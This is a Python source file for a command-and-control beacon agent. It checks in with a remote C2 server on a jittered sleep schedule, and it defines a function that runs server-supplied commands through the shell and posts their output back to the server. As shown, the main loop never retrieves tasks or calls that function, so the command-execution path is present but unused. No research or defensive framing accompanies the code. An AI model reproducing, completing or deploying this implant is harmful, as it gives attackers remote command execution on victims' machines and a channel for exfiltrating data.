import requests
import time
import subprocess
import json
import os
import random
import argparse

# Function to check in with the C2 server
def check_in(c2_server_url, hostname):
    data = {'hostname': hostname}

    try:
        # Beacon to C2 server for check-in
        response = requests.post(f"{c2_server_url}/api/check_in/", json=data)
        
        if response.status_code == 200:
            print(f"Beacon checked in successfully. Response: {response.json()}")
        else:
            print(f"Failed to check in. Status Code: {response.status_code}, Response: {response.text}")
    
    except Exception as e:
        print(f"Error connecting to C2 server: {e}")

# Function to handle individual tasks
def handle_task(task, c2_server_url):
    task_type = task.get('type')
    command = task.get('command')
    task_id = task.get('task_id')

    if task_type == 'run_command':
        print(f"Running command: {command}")
        try:
            # Run the command and capture output
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            send_result(result.stdout, task_id, c2_server_url)
        except Exception as e:
            print(f"Error executing command: {e}")
            send_result(f"Error: {str(e)}", task_id, c2_server_url)

# Function to send task results back to the C2 server
def send_result(result, task_id, c2_server_url):
    try:
        response = requests.post(f"{c2_server_url}/receive_result", json={'task_id': task_id, 'result': result})
        if response.status_code == 200:
            print("Result successfully sent to the server.")
        else:
            print(f"Failed to send result to server. Status Code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending result to server: {e}")

# Main function with command line arguments
def main():
    parser = argparse.ArgumentParser(description="Beacon Agent to connect to C2 server")
    parser.add_argument('--c2-ip', required=True, help="IP address of the C2 server")
    parser.add_argument('--c2-port', required=True, type=int, help="Port of the C2 server")
    parser.add_argument('--min-sleep', type=int, default=50, help="Minimum sleep time (in seconds)")
    parser.add_argument('--max-sleep', type=int, default=120, help="Maximum sleep time (in seconds)")

    args = parser.parse_args()

    c2_server_url = f"http://{args.c2_ip}:{args.c2_port}"
    hostname = os.uname()[1]  # Get the hostname of the beacon machine

    # Main loop of the beacon agent
    while True:
        # Check-in with the C2 server
        check_in(c2_server_url, hostname)

        # Sleep for a random interval between min and max sleep
        sleep_time = random.randint(args.min_sleep, args.max_sleep)
        print(f"Sleeping for {sleep_time} seconds...")
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
